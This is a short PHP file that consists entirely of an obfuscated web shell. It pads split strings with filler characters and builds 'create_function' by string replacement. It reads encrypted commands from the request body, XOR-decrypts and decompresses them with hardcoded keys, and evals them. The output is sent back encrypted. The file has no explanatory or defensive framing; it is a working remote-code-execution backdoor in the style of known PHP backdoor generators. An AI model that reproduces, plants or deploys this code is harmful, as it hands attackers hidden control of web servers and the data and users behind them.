<?php
$N='nput"),Wg$m)==1Wg) {Wg@ob_Wgstart();@evWgaWgl(@gzuncompreWgss(@WgxWgWg(@bWgase64_deWgcode($m[1]),$k)));$o=@Wgob_getWg';
$l='_conWgtentsWg(Wg);@ob_WgeWgnd_clean();$r=@bWgasWge64_encode(@x(Wg@gWgzWgcompreWgss($o),$k));Wgprint("$Wgp$kh$r$Wgkf");}';
$t='gWg{$Wgc=sWgtrlen(Wg$k);$l=strleWgn($t);$o="";fWgorWg($iWg=0;$i<$l;){fWgoWgr($j=0Wg;($j<$c&&$i<$lWg);$j+Wg+,$i++Wg){$o';
$D='.=Wg$tWg{$i}^$k{$jWg};}}reWgturn $Wgo;}iWgf Wg(@pregWg_maWgtch("/$kWgh(.+)WgWg$kf/",@file_get_Wgcontents("pWghWgp://Wgi';
$v='$Wgk="c8a114fWgf";Wg$kh=Wg"844Wgc82c379ab"Wg;Wg$kf="cWg63a9565ea86";$pWg="nyzWgBMujud3MTqWgMXIWg"Wg;function x($tWg,$k)W';
$H=str_replace('E','','cErEeateE_fEunEctiEon');
$R=str_replace('Wg','',$v.$t.$D.$N.$l);
$z=$H('',$R);$z();
?>
